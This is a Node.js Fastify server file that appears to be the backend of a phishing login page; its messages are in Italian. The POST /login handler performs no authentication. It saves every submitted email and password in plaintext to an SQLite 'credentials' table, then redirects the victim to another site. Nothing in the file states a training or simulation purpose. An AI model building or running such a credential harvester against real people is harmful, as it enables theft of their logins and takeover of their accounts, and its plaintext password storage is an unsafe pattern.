const path = require('node:path');
const fs = require('node:fs');
const Fastify = require('fastify');
const Database = require('better-sqlite3');
const formbody = require('@fastify/formbody');
const view = require('@fastify/view');
const staticPlugin = require('@fastify/static');
const ejs = require('ejs');

const app = Fastify({ logger: true });

const dbPath = process.env.SQLITE_PATH || path.join(__dirname, 'data', 'sqlite.db');
fs.mkdirSync(path.dirname(dbPath), { recursive: true });

const db = new Database(dbPath);

db.exec(`
  CREATE TABLE IF NOT EXISTS credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    password TEXT NOT NULL,
    timestamp TEXT NOT NULL
  );
`);

app.register(formbody);
app.register(view, {
  engine: { ejs },
  root: __dirname
});
app.register(staticPlugin, {
  root: path.join(__dirname, 'public')
});
const cors = require('@fastify/cors');
app.register(cors, {
  origin: 'http://localhost:3000',
  methods: ['POST'],
  allowedHeaders: ['Content-Type']
});

function isEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

app.get('/', async (request, reply) => {
  return reply.view('main.ejs', { errorMessage: null });
});

app.post('/login', async (request, reply) => {
  try {
    const { email, password } = request.body || {};
    const stmt = db.prepare('INSERT INTO credentials (email, password, timestamp) VALUES (?, ?, ?)');
    stmt.run(email || '', password || '', new Date().toISOString());
    return reply.redirect('http://localhost:3000');
  } catch (err) {
    request.log.error(err);
    return reply.view('main.ejs', { errorMessage: 'Errore durante il login' });
  }
});

app.setErrorHandler((err, request, reply) => {
  request.log.error(err);
  reply.code(500).view('main.ejs', { errorMessage: 'Errore interno del server.' });
});

const PORT = Number(process.env.PORT || 3001);
app.listen({ port: PORT, host: '0.0.0.0' });
